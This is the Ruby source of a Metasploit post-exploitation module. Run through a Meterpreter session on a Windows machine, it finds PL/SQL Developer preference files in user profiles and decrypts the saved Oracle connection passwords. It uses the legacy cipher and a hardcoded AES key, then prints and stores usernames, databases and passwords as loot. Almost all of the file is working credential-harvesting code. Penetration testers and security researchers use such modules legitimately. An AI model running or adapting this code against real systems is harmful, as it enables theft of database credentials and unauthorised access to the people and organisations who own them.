##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather PL/SQL Developer Connection Credentials',
        'Description' => %q{
          This module can decrypt the histories and connection credentials of PL/SQL Developer,
          and passwords are available if the user chooses to remember.
        },
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://adamcaudill.com/2016/02/02/plsql-developer-nonexistent-encryption/']
        ],
        'Author' => [
          'Adam Caudill', # Discovery of legacy decryption algorithm
          'Jemmy Wang' # Msf module & Discovery of AES decryption algorithm
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_fs_ls
              stdapi_fs_separator
              stdapi_fs_stat
            ]
          }
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )
    register_options(
      [
        OptString.new('PLSQL_PATH', [ false, 'Specify the path of PL/SQL Developer']),
      ]
    )
  end

  def decrypt_str_legacy(str)
    result = ''
    key = str[0..3].to_i
    for i in 1..(str.length / 4 - 1) do
      n = str[(i * 4)..(i * 4 + 3)].to_i
      result << (((n - 1000) ^ (key + i * 10)) >> 4).chr
    end
    return result
  end

  # New AES encryption algorithm introduced since PL/SQL Developer 15.0
  def decrypt_str_aes(str)
    bytes = Rex::Text.decode_base64(str)

    cipher = OpenSSL::Cipher.new('aes-256-cfb8')
    cipher.decrypt
    hash = Digest::SHA1.digest('PL/SQL developer + Oracle 11.0.x')
    cipher.key = hash + hash[0..11]
    cipher.iv = bytes[0..7] + "\x00" * 8

    return cipher.update(bytes[8..]) + cipher.final
  end

  def decrypt_str(str)
    # Empty string
    if str == ''
      return ''
    end

    if str.match(/^(\d{4})+$/)
      return decrypt_str_legacy(str) # Legacy encryption
    elsif str.match(%r{^X\.([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{4}|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)$})
      return decrypt_str_aes(str[2..]) # New AES encryption
    end

    # Shouldn't reach here
    print_error("Unknown encryption format: #{str}")
    return '[Unknown]'
  end

  # Parse and separate the history string
  def parse_history(str)
    # @keys is defined in decrypt_pref, and this function is called by decrypt_pref after @keys is defined
    result = Hash[@keys.map { |k| [k.to_sym, ''] }]
    result[:Parent] = '-2'

    if str.end_with?(' AS SYSDBA')
      result[:ConnectAs] = 'SYSDBA'
      str = str[0..-11]
    elsif str.end_with?(' AS SYSOPER')
      result[:ConnectAs] = 'SYSOPER'
      str = str[0..-12]
    else
      result[:ConnectAs] = 'Normal'
    end

    # Database should be the last part after '@' sign
    ind = str.rindex('@')
    if ind.nil?
      # Unexpected format, just use the whole string as DisplayName
      result[:DisplayName] = str
      return result
    end

    result[:Database] = str[(ind + 1)..]
    str = str[0..(ind - 1)]

    unless str.count('/') == 1
      # Unexpected format, just use the whole string as DisplayName
      result[:DisplayName] = str
      return result
    end

    result[:Username] = str[0..(str.index('/') - 1)]
    result[:Password] = str[(str.index('/') + 1)..]

    return result
  end

  def decrypt_pref(file_name)
    file_contents = read_file(file_name)
    if file_contents.nil? || file_contents.empty?
      print_status "Skipping empty file: #{file_name}"
      return []
    end

    print_status("Decrypting #{file_name}")
    result = []

    logon_history_section = false
    connections_section = false

    # Keys that we care about
    @keys = %w[DisplayName Number Parent IsFolder Username Database ConnectAs Password]
    # Initialize obj with empty values
    obj = Hash[@keys.map { |k| [k.to_sym, ''] }]
    # Folder parent objects
    folders = {}

    file_contents.split("\n").each do |line|
      line.gsub!(/(\n|\r)/, '')

      if line == '[LogonHistory]' && !(logon_history_section || connections_section)
        logon_history_section = true
        next
      elsif line == '[Connections]' && !(logon_history_section || connections_section)
        connections_section = true
        next
      elsif line == ''
        logon_history_section = false
        connections_section = false
        next
      end

      if logon_history_section
        # Contents in [LogonHistory] section are plain encrypted strings
        # Calling the legacy decrypt function is intentional here
        result << parse_history(decrypt_str_legacy(line))
      elsif connections_section
        # Contents in [Connections] section are key-value pairs
        ind = line.index('=')
        if ind.nil?
          print_error("Invalid line: #{line}")
          next
        end

        key = line[0..(ind - 1)]
        value = line[(ind + 1)..]

        if key == 'Password'
          obj[:Password] = decrypt_str(value)
        elsif obj.key?(key.to_sym)
          obj[key.to_sym] = value
        end

        # Color is the last field of a connection
        if key == 'Color'
          if obj[:IsFolder] != '1'
            result << obj
          else
            folders[obj[:Number]] = obj
          end

          # Reset obj
          obj = Hash[@keys.map { |k| [k.to_sym, ''] }]
        end

      end
    end

    # Build display name (Add parent folder name to the beginning of the display name)
    result.each do |item|
      pitem = item
      while pitem[:Parent] != '-1' && pitem[:Parent] != '-2'
        pitem = folders[pitem[:Parent]]
        if pitem.nil?
          print_error("Invalid parent: #{item[:Parent]}")
          break
        end
        item[:DisplayName] = pitem[:DisplayName] + '/' + item[:DisplayName]
      end

      if item[:Parent] == '-2'
        item[:DisplayName] = '[LogonHistory]' + item[:DisplayName]
      else
        item[:DisplayName] = '[Connections]/' + item[:DisplayName]
      end

      # Remove fields used to build the display name
      item.delete(:Parent)
      item.delete(:Number)
      item.delete(:IsFolder)

      # Add file path to the final result
      item[:FilePath] = file_name
    end

    return result
  end

  def enumerate_pref(plsql_path)
    result = []
    pref_dir = plsql_path + session.fs.file.separator + 'Preferences'
    session.fs.dir.entries(pref_dir).each do |username|
      udir = pref_dir + session.fs.file.separator + username
      file_name = udir + session.fs.file.separator + 'user.prefs'

      result << file_name if directory?(udir) && file?(file_name)
    end

    return result
  end

  def run
    print_status("Gather PL/SQL Developer Histories and Credentials on #{sysinfo['Computer']}")
    profiles = grab_user_profiles
    pref_paths = []

    profiles.each do |user_profiles|
      session.fs.dir.entries(user_profiles['AppData']).each do |dirname|
        if dirname.start_with?('PLSQL Developer')
          search_dir = user_profiles['AppData'] + session.fs.file.separator + dirname
          pref_paths += enumerate_pref(search_dir)
        end
      end
    end
    pref_paths += enumerate_pref(datastore['PLSQL_PATH']) if datastore['PLSQL_PATH'].present?

    result = []
    pref_paths.uniq.each { |pref_path| result += decrypt_pref(pref_path) }

    tbl = Rex::Text::Table.new(
      'Header' => 'PL/SQL Developer Histories and Credentials',
      'Columns' => ['DisplayName', 'Username', 'Database', 'ConnectAs', 'Password', 'FilePath']
    )

    result.each do |item|
      tbl << item.values
    end

    print_line(tbl.to_s)
    # Only save data to disk when there's something in the table
    if tbl.rows.count > 0
      path = store_loot('host.plsql_developer', 'text/plain', session, tbl, 'plsql_developer.txt', 'PL/SQL Developer Histories and Credentials')
      print_good("Passwords stored in: #{path}")
    end
  end
end
